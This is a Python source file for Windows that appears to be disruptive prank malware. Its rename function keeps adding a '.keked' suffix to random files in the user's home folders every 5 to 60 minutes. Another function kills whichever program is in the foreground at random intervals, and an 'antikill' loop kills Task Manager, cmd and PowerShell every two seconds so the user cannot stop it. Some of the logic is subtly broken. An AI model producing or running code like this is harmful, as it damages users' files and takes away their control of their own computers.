import os.path
import subprocess
import time
import random
import glob
import win32gui
import ctypes
import win32con


def rename():

    username = os.getlogin()
    filepaths = []
    dirs = []

    # get most file paths in users home dir. we don't wanna cause too much damage and take system files
    for dir, subdir, files in os.walk(f'C:/Users/{username}/'):
        if 'Desktop' and 'Documents' and 'Music' and 'Videos' and 'Downloads' in dir:
            if 'AppData' not in dir:
                dirs.append(dir)

    for dir in dirs:
        for directory, subdirectory, files, in os.walk(dir):
            for file in files:
                    filepath = os.path.join(file, directory)
                    filepaths.append(filepath)

    # randomly add .keked to 5 files every 5 to 60 minutes
    while True:
        for i in range(0, 5):
            try:
                file_to_rename = filepaths[random.randint(0, len(filepaths)-1)]
                os.rename(file_to_rename, f'{file_to_rename}.keked')
            except:
                continue
        time.sleep(random.randint(300, 3600))

def closeactivewindow():

    while True:
        try:
            time.sleep(random.randint(10, 120))
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            pid = ctypes.c_ulong()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_TERMINATE, False, pid.value)
            ctypes.windll.kernel32.TerminateProcess(handle, 0)
            ctypes.windll.kernel32.CloseHandle(handle)
        except:
            continue

def antikill():
    tokill = ["taskmgr.exe", "cmd.exe", "powershell.exe"]
    while True:
        for process in tokill:
            try:
                subprocess.getoutput(f"wmic process where name={process} delete")
            except:
                continue
            time.sleep(2)

















